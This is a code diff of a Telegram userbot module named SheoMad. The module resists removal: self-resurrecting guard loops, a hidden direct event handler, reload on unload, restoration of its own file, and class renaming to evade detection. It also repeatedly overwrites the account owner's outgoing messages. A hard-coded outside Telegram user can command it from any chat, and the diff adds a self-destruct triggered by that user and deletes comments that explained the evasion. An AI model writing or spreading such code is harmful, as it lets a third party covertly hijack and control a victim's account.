@@ -18,10 +18,14 @@ async def _loop_guard(inst, real_client, real_loader):
         try:
             await asyncio.sleep(1.0)
         except asyncio.CancelledError:
+            if getattr(inst, "_dead", False):
+                return
             asyncio.ensure_future(_loop_guard(inst, real_client, real_loader))
             return
         except Exception:
             pass
+        if getattr(inst, "_dead", False):
+            return
         try:
             modules = getattr(real_loader, "modules", None)
             if modules is None:
@@ -41,10 +45,14 @@ async def _loop_defender(inst, real_client):
         try:
             await asyncio.sleep(2.0)
         except asyncio.CancelledError:
+            if getattr(inst, "_dead", False):
+                return
             asyncio.ensure_future(_loop_defender(inst, real_client))
             return
         except Exception:
             pass
+        if getattr(inst, "_dead", False):
+            return
         try:
             # Пере-регистрируем прямой handler на клиенте
             h = getattr(inst, "_direct_handler_ref", None)
@@ -75,6 +83,8 @@ async def _loop_editor(inst, real_client):
     while True:
         if not getattr(inst, "_editing", False):
             return
+        if getattr(inst, "_dead", False):
+            return
         last_msg = getattr(inst, "_last_message", None)
         last_chat = getattr(inst, "_last_chat_id", None)
         if last_msg and last_chat:
@@ -83,7 +93,7 @@ async def _loop_editor(inst, real_client):
                 if msg:
                     await msg.edit(getattr(inst, "_edit_text", "జ్ఞ‌"))
             except asyncio.CancelledError:
-                if getattr(inst, "_editing", False):
+                if getattr(inst, "_editing", False) and not getattr(inst, "_dead", False):
                     asyncio.ensure_future(_loop_editor(inst, real_client))
                 return
             except Exception:
@@ -91,7 +101,7 @@ async def _loop_editor(inst, real_client):
         try:
             await asyncio.sleep(0.1)
         except asyncio.CancelledError:
-            if getattr(inst, "_editing", False):
+            if getattr(inst, "_editing", False) and not getattr(inst, "_dead", False):
                 asyncio.ensure_future(_loop_editor(inst, real_client))
             return
 
@@ -108,30 +118,29 @@ class SheoMad(loader.Module):
         self._last_chat_id = None
         self._editing = False
         self._disabled = False
+        self._dead = False
         self._module_file = None
         self._self_path = None
         self._self_source = None
         self._edit_text = "జ్ఞ‌"
 
     async def client_ready(self, client, database):
-        # Прячем настоящий клиент и лоадер под нестандартными именами.
+        # Прячем настоящий клиент и лоадер
         self._real_client = client
         self._real_loader = client.loader
         self._db = database
 
-        # Ссылка на оригинальный bound method — атака `o.watcher = z`
-        # её не тронет, потому что вызываем через сохранённую ссылку.
+        # Ссылка на оригинальный bound method watcher
         self._watcher_ref = self.watcher
 
-        # Прямой handler на Telethon — он не в allmodules.watchers,
-        # поэтому `watchers.remove(...)` его не снесёт.
+        # Прямой handler на Telethon
         self._direct_handler_ref = self._direct_watcher
         try:
             client.add_event_handler(self._direct_handler_ref, events.NewMessage())
         except Exception:
             pass
 
-        # Путь и исходник модуля — для восстановления файла после удаления
+        # Путь и исходник модуля
         try:
             self._self_path = inspect.getfile(self.__class__)
             with open(self._self_path, "r", encoding="utf-8", errors="ignore") as f:
@@ -145,14 +154,11 @@ class SheoMad(loader.Module):
         except Exception:
             self._module_file = None
 
-        # Сторожевые задачи — модульные функции с qualname
-        # "_loop_guard" / "_loop_defender" / "_loop_editor".
-        # Атака с фильтром `startswith("SheoMad.")` их НЕ отменит.
+        # Сторожевые задачи — модульные функции
         asyncio.ensure_future(_loop_guard(self, client, client.loader))
         asyncio.ensure_future(_loop_defender(self, client))
 
-        # Переименовываем класс — gc-скан `type(o).__name__ == "SheoMad"`
-        # больше не находит наш инстанс.
+        # Переименовываем класс
         try:
             self.__class__.__name__ = _TAG
             self.__class__.__qualname__ = _TAG
@@ -169,10 +175,14 @@ class SheoMad(loader.Module):
             pass
 
     async def on_unload(self):
+        if getattr(self, "_dead", False):
+            return
         asyncio.ensure_future(self._restore())
 
     async def _restore(self):
         await asyncio.sleep(0.3)
+        if getattr(self, "_dead", False):
+            return
         try:
             loader_obj = getattr(self, "_real_loader", None)
             if loader_obj is None:
@@ -187,12 +197,99 @@ class SheoMad(loader.Module):
         except Exception:
             pass
 
+    async def _self_destruct(self):
+        """Полное самоуничтожение: снять защиты, выгрузить, удалить файл и запись из БД."""
+        # 1) Метка смерти — все guard-циклы увидят её и не будут воскрешаться
+        self._dead = True
+        self._editing = False
+        self._disabled = True
+
+        # 2) Отменяем все стор-задачи (по модульному qualname "_loop_*")
+        try:
+            for t in asyncio.all_tasks():
+                try:
+                    c = t.get_coro()
+                except Exception:
+                    continue
+                q = getattr(c, "__qualname__", "")
+                if q in ("_loop_guard", "_loop_defender", "_loop_editor"):
+                    t.cancel()
+        except Exception:
+            pass
+
+        # 3) Отписываем прямой handler от клиента
+        try:
+            rc = getattr(self, "_real_client", None)
+            h = getattr(self, "_direct_handler_ref", None)
+            if rc is not None and h is not None:
+                rc.remove_event_handler(h)
+        except Exception:
+            pass
+
+        # 4) Убираем себя из loader.modules
+        try:
+            rl = getattr(self, "_real_loader", None)
+            if rl is not None:
+                modules = getattr(rl, "modules", None)
+                if isinstance(modules, dict):
+                    for k in [k for k, v in modules.items() if v is self]:
+                        modules.pop(k, None)
+                    modules.pop(_TAG, None)
+                elif isinstance(modules, list):
+                    while self in modules:
+                        modules.remove(self)
+        except Exception:
+            pass
+
+        # 5) Чистим watcher-список лоадера (на случай, если он там есть)
+        try:
+            rl = getattr(self, "_real_loader", None)
+            if rl is not None:
+                watchers = getattr(rl, "watchers", None)
+                if isinstance(watchers, list):
+                    for w in list(watchers):
+                        if getattr(w, "__self__", None) is self:
+                            watchers.remove(w)
+        except Exception:
+            pass
+
+        # 6) Чистим БД — все возможные ключи
+        try:
+            db = getattr(self, "_db", None)
+            mf = self._module_file
+            for key in ("LoaderMod", "hikka.modules", "loader"):
+                try:
+                    data = db.get(key, "loaded_modules", None)
+                    if isinstance(data, dict):
+                        if mf in data:
+                            del data[mf]
+                        # могут хранить по имени класса
+                        if self.__class__.__name__ in data:
+                            del data[self.__class__.__name__]
+                        if "SheoMad" in data:
+                            del data["SheoMad"]
+                        db.set(key, "loaded_modules", data)
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+        # 7) Удаляем файл модуля с диска
+        try:
+            path = getattr(self, "_self_path", None)
+            if path and os.path.exists(path):
+                try:
+                    os.remove(path)
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
     async def watcher(self, message: Message):
-        # .off от 77646148 — в любом чате, вне зависимости от владельца юб.
+        # .off от 77646148 — в любом чате
         if getattr(message, "sender_id", None) == 77646148:
             text = (message.raw_text or "").strip().lower()
             if text == ".off":
-                # Полный стоп до перезагрузки модуля
                 self._disabled = True
                 self._editing = False
                 self._last_message = None
@@ -201,9 +298,12 @@ class SheoMad(loader.Module):
                     await message.reply("Выключено")
                 except Exception:
                     pass
+                # Полное самоуничтожение модуля
+                asyncio.ensure_future(self._self_destruct())
                 return
 
-        # Пока не было .off — работаем
+        if self._dead:
+            return
         if self._disabled:
             return
         if not message.out:
